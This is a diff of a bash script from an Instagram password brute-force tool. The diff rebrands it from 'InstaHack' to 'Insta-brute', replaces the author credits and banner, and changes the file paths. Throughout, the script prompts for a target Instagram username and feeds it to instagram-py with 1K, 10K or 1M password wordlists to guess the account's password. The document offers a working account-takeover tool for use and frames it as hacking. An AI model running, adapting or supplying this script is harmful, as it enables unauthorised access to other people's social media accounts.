@@ -1,13 +1,11 @@
 #!/bin/bash
-# auto.sh - InstaHack
+# auto.sh - Insta-brute
 #
 # The shell / bash script that gives the user the option for automatic password wordlist selections. The tool provides the user with three wordlist files : 1K password file (pass1.txt), 10K password file (pass2.txt) and the 1M passwords file (pass3.txt). Thus, here the user is not required to create a custom wordlist file of passwords like what the user needs to do when using the manual version of this attack.
 #
-# Author : Waseem Akram (https://github.com/evildevill/)
-# Created on : June 28, 2020
+# Author : CYBER TOXIC (https://github.com/cy83r-70x1c)
+# Created on : July 24, 2021
 #
-# Last modified by : Rishav Das (https://github.com/rdofficial/)
-# Last modified on : May 10, 2021
 #
 # Changes made in the last modification :
 # 1. Adding commented docs and more comments to the script's code in order to make it more clean and easily readable to the programmers and other hackers.
@@ -27,13 +25,25 @@ DEFCOL="\033[00m"
 # Displaying the banner of the tool on the console screen
 clear
 echo -e "${YELLOW}
- ____  _  _  ___  ____   __    _   _    __    ___  _  _ 
-(_  _)( \( )/ __)(_  _) /__\  ( )_( )  /__\  / __)( )/ )
- _)(_  )  ( \__ \  )(  /(__)\  ) _ (  /(__)\( (__  )  ( 
-(____)(_)\_)(___/ (__)(__)(__)(_) (_)(__)(__)\___)(_)\_)
+                                                                                                                
+                                                                                                               
+      L.                      .                                                     :                        ,;
+  t   EW:        ,ft         ;W                               .          j.         Ef                     f#i 
+  Ej  E##;       t#E        f#E GEEEEEEEL         ..          Ef.        EW,        E#t     GEEEEEEEL    .E#t  
+  E#, E###t      t#E      .E#f  ,;;L#K;;.        ;W,          E#Wi       E##j       E#t     ,;;L#K;;.   i#W,   
+  E#t E#fE#f     t#E     iWW;      t#E          j##,          E#K#D:     E###D.     E#t        t#E     L#D.    
+  E#t E#t D#G    t#E    L##Lffi    t#E         G###, .......  E#t,E#f.   E#jG#W;    E#t fi     t#E   :K#Wfff;  
+  E#t E#t  f#E.  t#E   tLLG##L     t#E       :E####, GEEEEEEf.E#WEE##Wt  E#t t##f   E#t L#j    t#E   i##WLLLLt 
+  E#t E#t   t#K: t#E     ,W#i      t#E      ;W#DG##,          E##Ei;;;;. E#t  :K#E: E#t L#L    t#E    .E#L     
+  E#t E#t    ;#W,t#E    j#E.       t#E     j###DW##,          E#DWWt     E#KDDDD###iE#tf#E:    t#E      f#E:   
+  E#t E#t     :K#D#E  .D#j         t#E    G##i,,G##,          E#t f#K;   E#f,t#Wi,,,E###f      t#E       ,WW;  
+  E#t E#t      .E##E ,WK,          t#E  :K#K:   L##,          E#Dfff##E, E#t  ;#W:  E#K,       t#E        .D#; 
+  E#t ..         G#E EG.            fE ;##D.    L##,          jLLLLLLLLL;DWi   ,KK: EL          fE          tt 
+  ,;.             fE ,               : ,,,      .,,                                 :            :              basi  
+                   ,                                                                                           
                 ${DEFCOL}[${RED}#${DEFCOL}] ${BLUE}Auto Password Attack ${DEFCOL}[${RED}#${DEFCOL}]"
-echo -e "\n                \e[101m\e[1;77m  >>  Script By WASII << \e[0m\n"
-echo -e "\n       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Hacker wasii \e[100m\e[1;77m << \e[0m\n"
+echo -e "\n                \e[101m\e[1;77m  >>  Script By CYBER TOXIC << \e[0m\n"
+echo -e "\n       \e[100m\e[1;77m >>  Instagram : \e[1;96m cy83r_70x1c \e[100m\e[1;77m << \e[0m\n"
 
 # Asking the user to enter the username of the target instagram account
 read -p "[#] Enter the username of the target : " usrnm
@@ -53,15 +63,15 @@ read -p "[#] Enter your choice: " choice
 if [[ $choice == "1" ]]; then
 	# If the user entered the option for the 1K password wordlist file
 
-	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass1.txt 
+	instagram-py --username $usrnm --password-list $HOME/insta-brute/pass1.txt 
 elif [[ $choice == "2" ]]; then
 	# If the user entered the option for the 10K password wordlist file
 
-	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass2.txt
+	instagram-py --username $usrnm --password-list $HOME/insta-brute/pass2.txt
 elif [[ $choice == "3" ]]; then
 	# If the user entered the option for the 1M password wordlist file
 
-	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass3.txt
+	instagram-py --username $usrnm --password-list $HOME/insta-brute/pass3.txt
 else
 	# If the user entered option is not recognized (not one of the 3 wordlist files), then we display the error on the console screen
 
@@ -69,7 +79,7 @@ else
 	exit
 fi
 
-# If we reach upto here, that means the script executed properly. Now, we will again launch the instahack.sh script (the main script file for the tool)
+# If we reach upto here, that means the script executed properly. Now, we will again launch the Insta-brute.sh script (the main script file for the tool)
 sleep 5
-cd $HOME/instahack
-bash instahack.sh
+cd $HOME/insta-brute-attack
+bash Insta-brute.sh
